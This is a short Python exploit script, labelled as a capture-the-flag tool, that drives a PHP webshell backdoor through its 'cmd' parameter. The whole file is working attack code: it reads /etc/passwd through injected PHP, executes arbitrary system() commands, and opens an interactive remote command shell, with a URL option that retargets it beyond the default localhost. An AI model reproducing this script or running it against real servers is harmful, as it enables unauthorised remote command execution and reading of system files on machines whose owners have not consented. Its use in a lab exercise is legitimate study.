#!/usr/bin/env python3
"""
CTF Exploit Script - PHP Webshell Backdoor
Target: http://localhost:8080/shell.php
Parameter: cmd
"""

import requests
import argparse

DEFAULT_TARGET = "http://localhost:8080/shell.php"

def read_passwd(target):
    payload = 'echo file_get_contents("/etc/passwd");'
    try:
        resp = requests.post(target, data={"cmd": payload}, timeout=10)
        if resp.status_code == 200 and "root:" in resp.text:
            print("[+] /etc/passwd read success:")
            print(resp.text)
            return True
        else:
            print("[-] /etc/passwd read failed")
            print(resp.text)
            return False
    except requests.RequestException as e:
        print(f"[-] Connection error: {e}")
        return False

def run_cmd(target, cmd):
    payload = f'system("{cmd}");'
    try:
        resp = requests.post(target, data={"cmd": payload}, timeout=10)
        print(resp.text, end="")
    except requests.RequestException as e:
        print(f"[-] Error: {e}")

def interactive_shell(target):
    print("[+] Interactive shell (type 'exit' to quit)")
    while True:
        try:
            cmd = input("cmd> ").strip()
            if cmd.lower() == "exit":
                break
            if cmd:
                run_cmd(target, cmd)
        except (EOFError, KeyboardInterrupt):
            print()
            break

def main():
    parser = argparse.ArgumentParser(description="CTF Exploit - PHP Backdoor")
    parser.add_argument("-c", "--cmd", type=str, help="Execute single command")
    parser.add_argument("-r", "--read-passwd", action="store_true", help="Only read /etc/passwd")
    parser.add_argument("-u", "--url", type=str, default=DEFAULT_TARGET, help="Target URL")
    args = parser.parse_args()

    target = args.url

    if args.cmd:
        run_cmd(target, args.cmd)
    elif args.read_passwd:
        read_passwd(target)
    else:
        # Default: verify /etc/passwd then drop to shell
        if read_passwd(target):
            interactive_shell(target)

if __name__ == "__main__":
    main()
